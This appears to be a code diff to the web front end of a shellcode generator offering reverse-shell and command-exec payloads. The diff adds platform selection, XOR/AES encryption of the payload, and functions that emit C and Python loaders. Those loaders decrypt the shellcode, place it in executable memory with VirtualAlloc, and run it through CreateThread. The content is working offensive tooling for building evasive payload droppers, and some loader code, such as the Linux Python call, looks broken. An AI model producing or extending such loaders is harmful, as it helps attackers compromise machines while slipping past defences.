@@ -122,6 +122,15 @@
 
         <form id="shellcodeForm">
             <div class="form-group">
+                <label for="platform">Target Platform:</label>
+                <select id="platform" required>
+                    <option value="windows">Windows</option>
+                    <option value="linux">Linux</option>
+                    <option value="macos">macOS</option>
+                </select>
+            </div>
+
+            <div class="form-group">
                 <label for="shellcodeType">Shellcode Type:</label>
                 <select id="shellcodeType" required>
                     <option value="reverse">Reverse Shell</option>
@@ -154,6 +163,20 @@
                 </select>
             </div>
 
+            <div class="form-group">
+                <label for="encryption">Encryption:</label>
+                <select id="encryption">
+                    <option value="none">None</option>
+                    <option value="xor">XOR</option>
+                    <option value="aes">AES</option>
+                </select>
+            </div>
+
+            <div class="form-group" id="keyGroup" style="display: none;">
+                <label for="key">Encryption Key:</label>
+                <input type="text" id="key" placeholder="Enter encryption key">
+            </div>
+
             <button type="submit">Generate Shellcode</button>
         </form>
 
@@ -163,12 +186,14 @@
                 <button type="button" class="active" onclick="changeView('encoded')">Encoded</button>
                 <button type="button" onclick="changeView('c')">C-style</button>
                 <button type="button" onclick="changeView('python')">Python</button>
+                <button type="button" onclick="changeView('raw')">Raw Bytes</button>
             </div>
             <pre><code id="shellcode-output" class="plaintext">No output yet...</code></pre>
             <button onclick="copyShellcode()">📋 Copy</button>
             <button onclick="downloadShellcode()">⬇️ Download Shellcode</button>
             <button onclick="downloadStub('c')">.c Loader</button>
             <button onclick="downloadStub('python')">.py Loader</button>
+            <button onclick="downloadStub('exe')">.exe Loader</button>
         </div>
     </div>
 
@@ -186,18 +211,34 @@
             document.getElementById('commandGroup').style.display = type === 'exec' ? 'block' : 'none';
         });
 
+        document.getElementById('encryption').addEventListener('change', function() {
+            const keyGroup = document.getElementById('keyGroup');
+            keyGroup.style.display = this.value !== 'none' ? 'block' : 'none';
+        });
+
         document.getElementById('shellcodeForm').addEventListener('submit', function (e) {
             e.preventDefault();
 
             const type = document.getElementById('shellcodeType').value;
+            const platform = document.getElementById('platform').value;
             const port = document.getElementById('port').value;
             const encoding = document.getElementById('encoding').value;
+            const encryption = document.getElementById('encryption').value;
             const host = document.getElementById('host').value;
             const command = document.getElementById('command').value;
+            const key = document.getElementById('key').value;
 
-            const data = { type, port, encoding };
+            const data = { 
+                type, 
+                platform,
+                port, 
+                encoding,
+                encryption
+            };
+
             if (type === 'reverse') data.host = host;
             if (type === 'exec') data.command = command;
+            if (encryption !== 'none') data.key = key;
 
             fetch('/api/generate_shellcode', {
                 method: 'POST',
@@ -209,7 +250,7 @@
                 if (data.shellcode) {
                     encodedShellcode = data.shellcode;
                     document.getElementById('result').style.display = 'block';
-                    document.querySelector('.view-tabs button.active').click(); // trigger view update
+                    document.querySelector('.view-tabs button.active').click();
                 } else {
                     document.getElementById('shellcode-output').textContent = 'Error: ' + (data.error || 'Unknown');
                 }
@@ -231,6 +272,8 @@
                 output = encodedShellcode.match(/.{1,2}/g)?.map(b => `\\x${b}`).join('');
             } else if (view === 'python') {
                 output = "b'" + encodedShellcode.match(/.{1,2}/g)?.map(b => `\\x${b}`).join('') + "'";
+            } else if (view === 'raw') {
+                output = encodedShellcode.match(/.{1,2}/g)?.join(' ');
             }
 
             document.getElementById('shellcode-output').textContent = output || '';
@@ -253,12 +296,19 @@
 
         function downloadStub(format) {
             const shellcode = document.getElementById('shellcode-output').textContent;
+            const platform = document.getElementById('platform').value;
+            const encryption = document.getElementById('encryption').value;
+            const key = document.getElementById('key').value;
 
             let stub = '';
             if (format === 'c') {
-                stub = `unsigned char shellcode[] = "${shellcode}";\n\nint main() {\n  int (*ret)() = (int(*)())shellcode;\n  ret();\n}`;
-            } else {
-                stub = `shellcode = ${shellcode}\n\nimport ctypes\nctypes.CDLL(None).call(shellcode)`;
+                stub = generateCLoader(shellcode, platform, encryption, key);
+            } else if (format === 'python') {
+                stub = generatePythonLoader(shellcode, platform, encryption, key);
+            } else if (format === 'exe') {
+                // This would require server-side compilation
+                alert('EXE generation requires server-side compilation. Please use the C loader instead.');
+                return;
             }
 
             const blob = new Blob([stub], { type: 'text/plain' });
@@ -266,6 +316,73 @@
             a.href = URL.createObjectURL(blob);
             a.download = format === 'c' ? 'loader.c' : 'loader.py';
             a.click();
+        }
+
+        function generateCLoader(shellcode, platform, encryption, key) {
+            let loader = `#include <windows.h>\n\n`;
+            
+            if (encryption !== 'none') {
+                loader += `// Decryption function\n`;
+                if (encryption === 'xor') {
+                    loader += `void decrypt(char* data, size_t len, const char* key) {\n`;
+                    loader += `    for(size_t i = 0; i < len; i++) {\n`;
+                    loader += `        data[i] ^= key[i % strlen(key)];\n`;
+                    loader += `    }\n}\n\n`;
+                } else if (encryption === 'aes') {
+                    loader += `// AES decryption implementation here\n`;
+                }
+            }
+
+            loader += `unsigned char shellcode[] = "${shellcode}";\n\n`;
+            loader += `int main() {\n`;
+            
+            if (encryption !== 'none') {
+                loader += `    decrypt(shellcode, sizeof(shellcode), "${key}");\n`;
+            }
+
+            if (platform === 'windows') {
+                loader += `    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n`;
+                loader += `    memcpy(exec, shellcode, sizeof(shellcode));\n`;
+                loader += `    ((void(*)())exec)();\n`;
+            } else {
+                loader += `    int (*ret)() = (int(*)())shellcode;\n`;
+                loader += `    ret();\n`;
+            }
+
+            loader += `    return 0;\n}\n`;
+            return loader;
+        }
+
+        function generatePythonLoader(shellcode, platform, encryption, key) {
+            let loader = `import ctypes\n`;
+            
+            if (encryption !== 'none') {
+                loader += `def decrypt(data, key):\n`;
+                if (encryption === 'xor') {
+                    loader += `    return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])\n`;
+                } else if (encryption === 'aes') {
+                    loader += `    # AES decryption implementation here\n`;
+                    loader += `    pass\n`;
+                }
+                loader += `\n`;
+            }
+
+            loader += `shellcode = ${shellcode}\n\n`;
+            
+            if (encryption !== 'none') {
+                loader += `shellcode = decrypt(shellcode, "${key}")\n\n`;
+            }
+
+            if (platform === 'windows') {
+                loader += `ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p\n`;
+                loader += `exec = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)\n`;
+                loader += `ctypes.windll.kernel32.RtlMoveMemory(exec, shellcode, len(shellcode))\n`;
+                loader += `ctypes.windll.kernel32.CreateThread(0, 0, exec, 0, 0, 0)\n`;
+            } else {
+                loader += `ctypes.CDLL(None).call(shellcode)\n`;
+            }
+
+            return loader;
         }
 
         function toggleTheme() {
